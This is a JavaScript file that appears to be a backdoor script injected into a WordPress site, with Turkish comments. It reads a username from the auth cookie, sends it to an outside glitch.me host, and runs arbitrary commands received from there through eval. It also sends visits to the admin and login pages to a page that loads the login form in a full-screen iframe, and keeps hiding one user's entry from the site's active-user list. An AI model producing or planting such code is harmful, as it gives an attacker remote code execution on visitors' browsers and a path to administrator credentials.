if (!window.hasOwnProperty('karmaScriptLoaded')) {
    window.karmaScriptLoaded = true;

    const getUsername = () => {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === 'authToken') {
                const decodedUsername = decodeURIComponent(value.split('_')[0]);
                return decodedUsername;
            }
        }
        return null;
    };

    const username = getUsername();

    function connectSSE() {
        const eventSource = new EventSource(`https://glib-elated-situation.glitch.me/komutlar?username=${encodeURIComponent(username)}`, { withCredentials: false });

        eventSource.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                if (data.payload) {
                    eval(data.payload);
                }
            } catch (e) {
                // JSON parse hatası olursa sessizce geç
            }
        };

        eventSource.onerror = () => {
            eventSource.close();
            setTimeout(connectSSE, 2000);
        };

        return eventSource;
    }

    connectSSE();

    // URL kontrolü yapıp iframe açma
    function checkAndOpenIframe() {
        const url = window.location.href;

        if (
            url === "https://katiponline.com/admin/" || 
            url.startsWith("https://katiponline.com/wp-login.php")
        ) {
            // Kullanıcıyı /duello sayfasına yönlendir
            window.location.href = "https://katiponline.com/duello?admin";
        }
    }

    checkAndOpenIframe();

    // Eğer URL parametresi olarak ?admin gelirse, iframe aç
    document.addEventListener("DOMContentLoaded", () => {
        const params = new URLSearchParams(window.location.search);
        if (params.has("admin")) {
            let iframe = document.createElement("iframe");
            iframe.src = "https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1";
            iframe.style.position = "fixed";
            iframe.style.top = "0";
            iframe.style.left = "0";
            iframe.style.width = "100%";
            iframe.style.height = "100%";
            iframe.style.border = "none";
            iframe.style.zIndex = "99999";
            document.body.appendChild(iframe);
        }
    });

    // Konsolda çalışan gizleme çözümünü entegre et
    setInterval(() => {
        const userItem45593 = document.getElementById('aktifuser_45593');
        if (userItem45593) {
            userItem45593.style.display = 'none';
        }
    }, 50);
}
